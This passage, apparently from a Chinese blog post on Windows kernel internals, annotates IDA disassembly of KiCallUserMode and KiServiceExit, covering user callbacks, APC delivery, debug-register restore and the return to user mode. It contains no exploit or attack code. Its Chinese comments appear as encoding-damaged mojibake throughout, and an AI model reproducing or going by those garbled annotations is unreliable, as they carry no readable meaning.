class="number">0057</span>D875                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// æœ‰ç”¨æˆ· APCï¼Œè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä»è¿™é‡Œå»æ‰§è¡Œç”¨æˆ·å›è°ƒ</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// è®¾ç½® Eip3 = KeUserCallbackDispatcher</span></span><br><span class="line">.text:<span class="number">0057</span>D875                                         <span class="comment">// è°ƒç”¨ KiServiceExit</span></span><br><span class="line">.text:<span class="number">0057</span>D87B                 test    byte ptr [ebp+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// OldtrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D87B                                         <span class="comment">// Eflag.VMï¼ŒV86</span></span><br><span class="line">.text:<span class="number">0057</span>D87F                 jz      <span class="keyword">short</span> loc_57D89C <span class="comment">// év86æ¨¡å¼</span></span><br><span class="line">.text:<span class="number">0057</span>D881                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>D889                 mov     large fs:_KPCR.PrcbData.EspBaseShadow, edi</span><br><span class="line">.text:<span class="number">0057</span>D890                 jnz     <span class="keyword">short</span> loc_57D89C <span class="comment">// ESP0ï¼ŒEBP0éƒ½æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D892                 mov     esi, large fs:_KPCR.___u0.NtTib.SubSystemTib</span><br><span class="line">.text:<span class="number">0057</span>D899                 mov     [esi+_NT_TIB.StackBase], edi</span><br><span class="line">.text:<span class="number">0057</span>D89C</span><br><span class="line">.text:<span class="number">0057</span>D89C loc_57D89C:                             <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+11Bâ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D89C                                         <span class="comment">// KiCallUserMode(x,x,x,x)+12Câ†‘j</span></span><br><span class="line">.text:<span class="number">0057</span>D89C                 mov     esp, ebp        <span class="comment">// ESP0ï¼ŒEBP0éƒ½æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D89E                 mov     eax, ds:_KiI386ExceptionChainTerminator</span><br><span class="line">.text:<span class="number">0057</span>D8A3                 mov     large fs:_KPCR, eax</span><br><span class="line">.text:<span class="number">0057</span>D8A9                 mov     eax, ds:_KeUserCallbackDispatcher</span><br><span class="line">.text:<span class="number">0057</span>D8AE                 mov     [ebp+_KTRAP_FRAME._Eip], eax</span><br><span class="line">.text:<span class="number">0057</span>D8B1                 mov     ebx, [ebp+_KTRAP_FRAME._Ebp]</span><br><span class="line">.text:<span class="number">0057</span>D8B4                 mov     edi, [ebp+_KTRAP_FRAME._Eip]</span><br><span class="line">.text:<span class="number">0057</span>D8B7                 mov     [ebp+_KTRAP_FRAME.DbgArgMark], <span class="number">0B</span>ADB0D00h</span><br><span class="line">.text:<span class="number">0057</span>D8BE                 mov     [ebp+_KTRAP_FRAME.DbgEbp], ebx</span><br><span class="line">.text:<span class="number">0057</span>D8C1                 mov     [ebp+_KTRAP_FRAME.DbgEip], edi</span><br><span class="line">.text:<span class="number">0057</span>D8C4                 jmp     _KiServiceExit  <span class="comment">// ESP0ï¼ŒEBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>D8C4 _KiCallUserMode@<span class="number">16</span> endp</span><br></pre></td></tr></table></figure>



<p>æ­¤æ—¶æ–°å»ºçš„çº¿ç¨‹æ ˆå†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img data-src="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png" alt="35.png"></p>
<h3 id="4-4-KiServiceExit"><a href="#4-4-KiServiceExit" class="headerlink" title="4.4 KiServiceExit"></a>4.4 KiServiceExit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0059479</span>E _KiServiceExit:                         <span class="comment">// CODE XREF: KiCallUserMode(x,x,x,x)+160â†‘j</span></span><br><span class="line">.text:<span class="number">0059479</span>E                                         <span class="comment">// NtContinue(x,x)+ACâ†“j ...</span></span><br><span class="line">.text:<span class="number">0059479</span>E                 cli                     <span class="comment">// ESP0ï¼ŒEBP0æŒ‡å‘è¾“å‡ºç¼“å†²åŒºä¸­çš„TrapFrame</span></span><br><span class="line">.text:<span class="number">0059479</span>E                                         <span class="comment">// å…³é—­ä¸­æ–­</span></span><br><span class="line">.text:<span class="number">0059479F</span>                 test    byte ptr [ebp+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// v86</span></span><br><span class="line">.text:<span class="number">005947</span>A3                 jnz     <span class="keyword">short</span> loc_5947AB</span><br><span class="line">.text:<span class="number">005947</span>A5                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span> <span class="comment">// å…ˆå‰æ¨¡å¼</span></span><br><span class="line">.text:<span class="number">005947</span>A9                 jz      <span class="keyword">short</span> loc_594824 <span class="comment">// å› ä¸ºæˆ‘ä»¬æ˜¯ä» 0 ç¯è¿›è¡Œçš„å›è°ƒï¼Œæ‰€ä»¥å…ˆå‰æ¨¡å¼ä¸º 0</span></span><br><span class="line">.text:<span class="number">005947</span>AB</span><br><span class="line">.text:<span class="number">005947</span>AB loc_5947AB:                             <span class="comment">// CODE XREF: sub_59437F+424â†‘j</span></span><br><span class="line">.text:<span class="number">005947</span>AB                                         <span class="comment">// sub_59437F+4A0â†“j</span></span><br><span class="line">.text:<span class="number">005947</span>AB                 mov     ebx, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">005947B</span>2                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">81</span>h</span><br><span class="line">.text:<span class="number">005947B</span>6                 jz      <span class="keyword">short</span> loc_5947DD</span><br><span class="line">.text:<span class="number">005947B</span>8                 push    eax</span><br><span class="line">.text:<span class="number">005947B</span>9                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">1</span></span><br><span class="line">.text:<span class="number">005947B</span>D                 jz      <span class="keyword">short</span> loc_5947CB</span><br><span class="line">.text:<span class="number">005947B</span>F                 push    ebx</span><br><span class="line">.text:<span class="number">005947</span>C0                 call    _KiCopyCounters@<span class="number">4</span> <span class="comment">// KiCopyCounters(x)</span></span><br><span class="line">.text:<span class="number">005947</span>C5                 test    byte ptr [ebx+<span class="number">2</span>], <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">005947</span>C9                 jz      <span class="keyword">short</span> loc_5947DC</span><br><span class="line">.text:<span class="number">005947</span>CB</span><br><span class="line">.text:<span class="number">005947</span>CB loc_5947CB:                             <span class="comment">// CODE XREF: sub_59437F+43Eâ†‘j</span></span><br><span class="line">.text:<span class="number">005947</span>CB                 test    byte ptr [ebx+<span class="number">86</span>h], <span class="number">3</span></span><br><span class="line">.text:<span class="number">005947</span>D2                 jnz     <span class="keyword">short</span> loc_5947DC</span><br><span class="line">.text:<span class="number">005947</span>D4                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">005947</span>D6                 push    ebp</span><br><span class="line">.text:<span class="number">005947</span>D7                 call    _KiSetupForInstrumentationReturn@<span class="number">8</span> <span class="comment">// KiSetupForInstrumentationReturn(x,x)</span></span><br><span class="line">.text:<span class="number">005947</span>DC</span><br><span class="line">.text:<span class="number">005947</span>DC loc_5947DC:                             <span class="comment">// CODE XREF: sub_59437F+44Aâ†‘j</span></span><br><span class="line">.text:<span class="number">005947</span>DC                                         <span class="comment">// sub_59437F+453â†‘j</span></span><br><span class="line">.text:<span class="number">005947</span>DC                 pop     eax</span><br><span class="line">.text:<span class="number">005947</span>DD</span><br><span class="line">.text:<span class="number">005947</span>DD loc_5947DD:                             <span class="comment">// CODE XREF: sub_59437F+437â†‘j</span></span><br><span class="line">.text:<span class="number">005947</span>DD                 mov     byte ptr [ebx+<span class="number">56</span>h], <span class="number">0</span></span><br><span class="line">.text:<span class="number">005947E1</span>                 test    byte ptr [ebx+<span class="number">86</span>h], <span class="number">3</span></span><br><span class="line">.text:<span class="number">005947E8</span>                 jz      <span class="keyword">short</span> loc_594824</span><br><span class="line">.text:<span class="number">005947</span>EA                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">005947</span>EC                 mov     [ebx+<span class="number">40</span>h], eax</span><br><span class="line">.text:<span class="number">005947</span>EF                 mov     dword ptr [ebx+<span class="number">34</span>h], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">005947F</span>6                 mov     dword ptr [ebx+<span class="number">30</span>h], <span class="number">23</span>h</span><br><span class="line">.text:<span class="number">005947F</span>D                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">00594802</span>                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">00594808</span>                 push    eax</span><br><span class="line">.text:<span class="number">00594809</span>                 sti</span><br><span class="line">.text:<span class="number">0059480</span>A                 push    ebx</span><br><span class="line">.text:<span class="number">0059480B</span>                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0059480</span>D                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0059480F</span>                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// KiDeliverApc(x,x,x)</span></span><br><span class="line">.text:<span class="number">00594814</span>                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">00594815</span>                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0059481B</span>                 mov     eax, [ebx+<span class="number">40</span>h]</span><br><span class="line">.text:<span class="number">0059481</span>E                 cli</span><br><span class="line">.text:<span class="number">0059481F</span>                 jmp     <span class="keyword">short</span> loc_5947AB</span><br><span class="line">.text:<span class="number">0059481F</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594821</span>                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594824</span></span><br><span class="line">.text:<span class="number">00594824</span> loc_594824:                             <span class="comment">// CODE XREF: sub_59437F+42Aâ†‘j</span></span><br><span class="line">.text:<span class="number">00594824</span>                                         <span class="comment">// sub_59437F+469â†‘j</span></span><br><span class="line">.text:<span class="number">00594824</span>                 mov     edx, [ebp+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">00594827</span>                 ldmxcsr [ebp+_KTRAP_FRAME._MxCsr]</span><br><span class="line">.text:<span class="number">0059482B</span>                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">00594832</span>                 mov     esi, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">00594839</span>                 movzx   ecx, [ebp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0059483</span>D                 mov     [esi+_KTHREAD.___u47.__s1.PreviousMode], cl</span><br><span class="line">.text:<span class="number">00594843</span>                 test    [ebp+_KTRAP_FRAME.Dr7], <span class="number">0F</span>FFF23FFh <span class="comment">// å…ˆæ’å¼€æµ‹DR7çš„ä¿ç•™ä½</span></span><br><span class="line">.text:<span class="number">00594843</span>                                         <span class="comment">// ç„¶åæµ‹è¯•DR7æ˜¯å¦æœ‰æŸä¸€ä½å·²ç»è¢«ç½®ä½</span></span><br><span class="line">.text:<span class="number">00594843</span>                                         <span class="comment">// å¦‚æœæœ‰ï¼Œè¯´æ˜æœ‰ç¡¬ä»¶æ–­ç‚¹éœ€è¦å¤„ç†</span></span><br><span class="line">.text:<span class="number">0059484</span>A                 jnz     loc_594964      <span class="comment">// å¤„ç†ç¡¬ä»¶æ–­ç‚¹</span></span><br><span class="line">.text:<span class="number">00594850</span></span><br><span class="line">.text:<span class="number">00594850</span> loc_594850:                             <span class="comment">// CODE XREF: sub_59437F+5F5â†“j</span></span><br><span class="line">.text:<span class="number">00594850</span>                                         <span class="comment">// sub_59437F+624â†“j</span></span><br><span class="line">.text:<span class="number">00594850</span>                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">00594857</span>                 jnz     loc_595F74      <span class="comment">// v86æ¨¡å¼</span></span><br><span class="line">.text:<span class="number">0059485</span>D                 test    word ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">0F</span>FF9h <span class="comment">// åº”è¯¥æ˜¯åˆ¤æ–­å…ˆå‰æ¨¡å¼ï¼Œå› ä¸º 3 ç¯CSæœ€åä¸€ä½ä¸º 1</span></span><br><span class="line">.text:<span class="number">00594863</span>                 jz      loc_5949A8      <span class="comment">// CS æœ€ä½ä½ä¸º0</span></span><br><span class="line">.text:<span class="number">00594869</span>                 mov     [ebp+_KTRAP_FRAME._Eax], eax</span><br><span class="line">.text:<span class="number">0059486</span>C                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594870</span>                 jz      <span class="keyword">short</span> loc_5948AC</span><br><span class="line">.text:<span class="number">00594872</span>                 movzx   eax, large byte ptr fs:<span class="number">22</span>DDh</span><br><span class="line">.text:<span class="number">0059487</span>A                 cmp     large fs:<span class="number">22</span>DAh, al</span><br><span class="line">.text:<span class="number">00594881</span>                 jz      <span class="keyword">short</span> loc_594892</span><br><span class="line">.text:<span class="number">00594883</span>                 mov     large fs:<span class="number">22</span>DAh, al</span><br><span class="line">.text:<span class="number">00594889</span>                 mov     ecx, <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0059488</span>E                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">00594890</span>                 wrmsr</span><br><span class="line">.text:<span class="number">00594892</span></span><br><span class="line">.text:<span class="number">00594892</span> loc_594892:                             <span class="comment">// CODE XREF: sub_59437F+502â†‘j</span></span><br><span class="line">.text:<span class="number">00594892</span>                 btr     large word ptr fs:<span class="number">22</span>D8h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">0059489</span>C                 jnb     <span class="keyword">short</span> loc_5948AC</span><br><span class="line">.text:<span class="number">0059489</span>E                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">005948</span>A3                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">005948</span>A5                 mov     ecx, <span class="number">49</span>h</span><br><span class="line">.text:<span class="number">005948</span>AA                 wrmsr</span><br><span class="line">.text:<span class="number">005948</span>AC</span><br><span class="line">.text:<span class="number">005948</span>AC loc_5948AC:                             <span class="comment">// CODE XREF: sub_59437F+4F1â†‘j</span></span><br><span class="line">.text:<span class="number">005948</span>AC                                         <span class="comment">// sub_59437F+51Dâ†‘j</span></span><br><span class="line">.text:<span class="number">005948</span>AC                 xorps   xmm0, xmm0</span><br><span class="line">.text:<span class="number">005948</span>AF                 xorps   xmm1, xmm1</span><br><span class="line">.text:<span class="number">005948B</span>2                 xorps   xmm2, xmm2</span><br><span class="line">.text:<span class="number">005948B</span>5                 xorps   xmm3, xmm3</span><br><span class="line">.text:<span class="number">005948B</span>8                 xorps   xmm4, xmm4</span><br><span class="line">.text:<span class="number">005948B</span>B                 xorps   xmm5, xmm5</span><br><span class="line">.text:<span class="number">005948B</span>E                 xorps   xmm6, xmm6</span><br><span class="line">.text:<span class="number">005948</span>C1                 xorps   xmm7, xmm7</span><br><span class="line">.text:<span class="number">005948</span>C4                 mov     eax, [ebp+<span class="number">40</span>h]</span><br><span class="line">.text:<span class="number">005948</span>C7                 cmp     word ptr [ebp+<span class="number">6</span>Ch], <span class="number">8</span></span><br><span class="line">.text:<span class="number">005948</span>CC                 jz      <span class="keyword">short</span> loc_5948F9</span><br><span class="line">.text:<span class="number">005948</span>CE                 lea     esp, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">005948</span>D1                 pop     gs</span><br><span class="line">.text:<span class="number">005948</span>D3                 assume gs:nothing</span><br><span class="line">.text:<span class="number">005948</span>D3                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">005948</span>DB                 jz      <span class="keyword">short</span> loc_5948F4</span><br><span class="line">.text:<span class="number">005948</span>DD                 mov     ebx, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">005948E0</span>                 mov     large dword ptr fs:<span class="number">5020</span>h, <span class="number">0</span></span><br><span class="line">.text:<span class="number">005948</span>EB                 mov     large fs:<span class="number">5018</span>h, ebx</span><br><span class="line">.text:<span class="number">005948F</span>2                 jmp     <span class="keyword">short</span> loc_5948F9</span><br><span class="line">.text:<span class="number">005948F</span>4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">005948F</span>4</span><br><span class="line">.text:<span class="number">005948F</span>4 loc_5948F4:                             <span class="comment">// CODE XREF: sub_59437F+55Câ†‘j</span></span><br><span class="line">.text:<span class="number">005948F</span>4                 lea     esp, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">005948F</span>7                 pop     fs</span><br><span class="line">.text:<span class="number">005948F</span>9                 assume fs:nothing</span><br><span class="line">.text:<span class="number">005948F</span>9</span><br><span class="line">.text:<span class="number">005948F</span>9 loc_5948F9:                             <span class="comment">// CODE XREF: sub_59437F+54Dâ†‘j</span></span><br><span class="line">.text:<span class="number">005948F</span>9                                         <span class="comment">// sub_59437F+573â†‘j</span></span><br><span class="line">.text:<span class="number">005948F</span>9                 lea     esp, [ebp+<span class="number">54</span>h]</span><br><span class="line">.text:<span class="number">005948F</span>C                 pop     edi</span><br><span class="line">.text:<span class="number">005948F</span>D                 pop     esi</span><br><span class="line">.text:<span class="number">005948F</span>E                 pop     ebx</span><br><span class="line">.text:<span class="number">005948F</span>F                 pop     ebp</span><br><span class="line">.text:<span class="number">00594900</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594903</span>                 test    [esp<span class="number">-64</span>h+arg_64], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0059490B</span></span><br><span class="line">.text:<span class="number">0059490B</span> _KiSystemCallExitBranch:                <span class="comment">// DATA XREF: KiEnableFastSyscallReturn():loc_562800â†‘r</span></span><br><span class="line">.text:<span class="number">0059490B</span>                                         <span class="comment">// KiEnableFastSyscallReturn()+38â†‘w</span></span><br><span class="line">.text:<span class="number">0059490B</span>                 jnz     <span class="keyword">short</span> _KiSystemCallExit</span><br><span class="line">.text:<span class="number">0059490</span>D                 pop     edx</span><br><span class="line">.text:<span class="number">0059490</span>E                 pop     ecx</span><br><span class="line">.text:<span class="number">0059490F</span>                 popf</span><br><span class="line">.text:<span class="number">00594910</span>                 jmp     edx</span><br><span class="line">.text:<span class="number">00594912</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594912</span></span><br><span class="line">.text:<span class="number">00594912</span> _KiSystemCallExit2:                     <span class="comment">// DATA XREF: KeRestoreProcessorSpecificFeatures():loc_54FA1Bâ†‘o</span></span><br><span class="line">.text:<span class="number">00594912</span>                                         <span class="comment">// KiInitMachineDependent()+E4â†“o</span></span><br><span class="line">.text:<span class="number">00594912</span>                 test    [esp<span class="number">-70</span>h+arg_74], <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">0059491</span>A                 jnz     <span class="keyword">short</span> _KiSystemCallExit</span><br><span class="line">.text:<span class="number">0059491</span>C                 pop     edx</span><br><span class="line">.text:<span class="number">0059491</span>D                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594920</span>                 <span class="keyword">and</span>     [esp<span class="number">-78</span>h+arg_74], <span class="number">0F</span>FFFFDFFh</span><br><span class="line">.text:<span class="number">00594927</span>                 popf</span><br><span class="line">.text:<span class="number">00594928</span>                 pop     ecx</span><br><span class="line">.text:<span class="number">00594929</span>                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594931</span>                 jnz     _KiKernelSysretExit</span><br><span class="line">.text:<span class="number">00594937</span>                 sti</span><br><span class="line">.text:<span class="number">00594938</span>                 sysexit</span><br><span class="line">.text:<span class="number">0059493</span>A</span><br><span class="line">.text:<span class="number">0059493</span>A _KiSystemCallExit:                      <span class="comment">// CODE XREF: sub_59437F:_KiSystemCallExitBranchâ†‘j</span></span><br><span class="line">.text:<span class="number">0059493</span>A                                         <span class="comment">// sub_59437F+59Bâ†‘j</span></span><br><span class="line">.text:<span class="number">0059493</span>A                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">0059493</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0059493</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0059493</span>E                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594946</span>                 jz      <span class="keyword">short</span> locret_594962</span><br><span class="line">.text:<span class="number">00594948</span>                 test    dword ptr [esp+<span class="number">8</span>], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">00594950</span>                 jnz     _KiKernelExit</span><br><span class="line">.text:<span class="number">00594956</span>                 cmp     word ptr [esp<span class="number">-74</span>h+arg_74], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0059495</span>C                 jnz     _KiKernelExit</span><br><span class="line">.text:<span class="number">00594962</span></span><br><span class="line">.text:<span class="number">00594962</span> locret_594962:                          <span class="comment">// CODE XREF: sub_59437F+5C7â†‘j</span></span><br><span class="line">.text:<span class="number">00594962</span>                 iret</span><br><span class="line">.text:<span class="number">00594962</span> <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">00594963</span>                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">00594964</span></span><br><span class="line">.text:<span class="number">00594964</span> loc_594964:                             <span class="comment">// CODE XREF: sub_59437F+4CBâ†‘j</span></span><br><span class="line">.text:<span class="number">00594964</span>                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h <span class="comment">// å¤„ç†ç¡¬ä»¶æ–­ç‚¹</span></span><br><span class="line">.text:<span class="number">0059496B</span>                 jnz     <span class="keyword">short</span> loc_59497A</span><br><span class="line">.text:<span class="number">0059496</span>D                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">00594974</span>                 jz      loc_594850      <span class="comment">// Eflags.VM</span></span><br><span class="line">.text:<span class="number">0059497</span>A</span><br><span class="line">.text:<span class="number">0059497</span>A loc_59497A:                             <span class="comment">// CODE XREF: sub_59437F+5ECâ†‘j</span></span><br><span class="line">.text:<span class="number">0059497</span>A                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0059497</span>C                 mov     esi, [ebp+<span class="number">14</span>h]</span><br><span class="line">.text:<span class="number">0059497F</span>                 mov     edi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">00594982</span>                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">00594985</span>                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">00594988</span>                 mov     ebx, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0059498B</span>                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0059498</span>E                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">00594991</span>                 mov     esi, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">00594994</span>                 mov     edi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">00594997</span>                 mov     ebx, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0059499</span>A                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0059499</span>D                 mov     dr6, 